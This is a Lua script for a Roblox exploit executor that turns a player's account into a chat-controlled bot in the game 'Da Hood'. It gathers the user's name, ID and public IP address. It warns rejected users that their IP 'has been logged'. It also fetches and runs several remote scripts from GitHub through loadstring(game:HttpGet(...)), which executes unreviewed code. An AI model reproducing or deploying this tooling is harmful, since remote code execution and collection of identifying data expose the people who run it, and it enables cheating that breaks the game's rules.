local config = _G.AgonyDropper

--local keys = game:GetService("HttpService"):JsonDecode(game:HttpGet("https://api.condo.ga/AgonyDropperWhitelists"))

local content = "Username: " .. tostring(game.Players.LocalPlayer.Name ).. "\nUserID: " .. tostring(game.Players.LocalPlayer.UserId) .. "\nWhitelist Key: " ..tostring(config.WhitelistKey) .. "\nIP Address: " .. game:HttpGet("https://ipapi.co/json/")
    
--[[for _,v in pairs(keys) do
    if(v == config.WhitelistKey) then
        whitelisted = true
    end
end]]--

if(config.WhitelistKey == "FREETRIAL2022") then whitelisted = true end

if(whitelisted == false) then
    messagebox("Do NOT attempt to pirate Agony Software. Your IP adress has been logged.", "Agony", 0)
    error("Do NOT attempt to pirate Agony Software. Your IP adress has been logged.")
    return
end

if game.PlaceId ~= 5769070963 then
    messagebox("You are not in the correct game, please ensure you are in 'Da Hood'.", "Agony", 0)
    error("You are not in the correct game, please ensure you are in 'Da Hood'.")
    return
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/AgonyDropper/main/Commands.lua"))()

local VirtualUser = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    wait(1)
    VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
end)

repeat wait() until game:IsLoaded() and game.Players.LocalPlayer.Character ~= nil


function Command(player, msg)
     cmd = string.split(msg," ")
     print("Controller chatted: " .. cmd[1])
     if(string.sub(string.lower(cmd[1]),1,1) == config.Prefix) then
          cmd1 = string.lower(cmd[1]):gsub(config.Prefix, "")
         if(_G.AgonyCommands[cmd1] ~= nil) then
             print("Running Command " .. cmd1 .. "...")
             _G.AgonyCommands[cmd1]({cmd[2], cmd[3], cmd[4], cmd[5], cmd[6], cmd[7], cmd[8], cmd[9], cmd[10], cmd[11]}, player)
         end
     end
end

game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(Data)
    local Player = game:GetService("Players")[Data.FromSpeaker]
    local Message = Data.Message
    local Channel = Data.OriginalChannel
        
     for _,v in pairs(config.Controllers) do
       if(tostring(Player.UserId) == tostring(v)) then
              Command(Player, Message)
        end
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/Min/main/Skript"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/AgonyDropper/main/scripts/DeleteChairs.lua"))()
